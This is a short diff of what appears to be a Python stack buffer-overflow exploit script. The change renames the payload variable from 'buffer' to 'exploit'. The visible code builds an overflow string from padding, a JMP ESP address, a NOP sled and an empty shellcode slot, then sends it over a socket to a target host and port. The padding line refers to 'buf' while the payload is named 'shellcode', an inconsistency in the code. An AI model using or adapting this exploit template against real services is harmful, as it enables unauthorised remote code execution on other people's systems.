@@ -22,7 +22,7 @@ NOP_SLED = "\x90" * 32
 shellcode =  ""
 
 junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(buf) - len(NOP_SLED))
-buffer = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + shellcode + junk
+exploit = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + shellcode + junk
 
 
 try:
@@ -30,7 +30,7 @@ try:
     s.settimeout(2)
     s.connect((TARGET, PORT))
     data = s.recv(1024)
-    s.send(PATH + buffer)
+    s.send(PATH + exploit)
     data = s.recv(1024)
     s.close()
     sleep(1)
